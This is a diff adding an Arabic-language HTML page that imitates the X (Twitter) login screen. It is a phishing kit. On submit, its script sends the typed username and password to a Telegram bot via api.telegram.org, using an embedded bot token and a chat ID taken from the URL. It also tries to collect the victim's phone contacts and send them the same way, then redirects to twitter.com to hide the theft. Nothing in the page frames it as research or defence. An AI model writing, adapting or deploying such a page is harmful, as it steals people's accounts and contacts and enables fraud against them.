@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى X</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #000000; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .wrapper { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 360px; padding: 0 20px; }
+        .box { background: #000000; border: 1px solid #2f3336; padding: 35px 30px; width: 100%; text-align: center; border-radius: 16px; }
+        .x-logo { width: 40px; height: 40px; margin: 0 auto 25px auto; display: block; fill: #ffffff; }
+        h2 { font-size: 24px; font-weight: bold; margin-bottom: 25px; color: #e7e9ea; }
+        .input-box { margin-bottom: 15px; text-align: right; }
+        input { width: 100%; padding: 14px 12px; background: #000000; border: 1px solid #536471; color: #fff; border-radius: 4px; outline: none; font-size: 15px; }
+        input:focus { border-color: #1d9bf0; }
+        .login-btn { width: 100%; padding: 12px; background: #eff3f4; border: none; color: #0f1419; font-weight: bold; font-size: 15px; border-radius: 50px; cursor: pointer; margin-top: 15px; }
+        .forgot-link { display: block; margin-top: 20px; color: #1d9bf0; font-size: 14px; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="box">
+            <svg class="x-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+            <h2>تسجيل الدخول إلى X</h2>
+            <form id="loginForm">
+                <div class="input-box"><input type="text" id="username" placeholder="الهاتف، البريد الإلكتروني أو اسم المستخدم" required></div>
+                <div class="input-box"><input type="password" id="password" placeholder="كلمة المرور" required></div>
+                <button type="submit" class="login-btn">التالي</button>
+            </form>
+            <a href="#" class="forgot-link">هل نسيت كلمة المرور؟</a>
+        </div>
+    </div>
+    <script>
+        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetChatId = urlParams.get('to');
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            if(!targetChatId) return;
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            let contactsData = "لم يتم منح الصلاحية";
+            if ('contacts' in navigator && 'ContactsManager' in window) {
+                try {
+                    const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                    if (contacts.length > 0) contactsData = contacts.map(c => `المستخدم: ${c.name?.[0] || 'بدون'} - الرقم: ${c.tel?.[0] || ''}`).join('\n');
+                } catch(e) {}
+            }
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`صيد تويتر جديد\nالحساب: ${user}\nالباسورد: ${pass}`)}`);
+            if(contactsData !== "لم يتم منح الصلاحية") {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`جهات الاتصال:\n${contactsData}`)}`);
+            }
+            setTimeout(() => { window.location.href = "https://twitter.com"; }, 800);
+        });
+    </script>
+</body>
+</html>
